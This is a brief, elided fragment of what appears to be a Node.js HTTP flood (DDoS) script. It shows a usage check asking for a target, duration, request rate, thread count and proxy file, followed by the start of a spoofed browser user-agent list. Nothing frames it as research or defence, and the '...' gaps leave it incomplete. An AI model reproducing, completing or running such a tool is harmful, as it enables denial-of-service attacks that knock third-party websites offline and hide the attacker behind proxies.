...
if (process.argv.length < 7) {
    console.log(`[TARGET] [TIME] [RATE] [THREAD] [PROXY.TXT] `);
    process.exit();
}
const headers = {};
...
const osList = [
	...
	"wii libnup/1.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
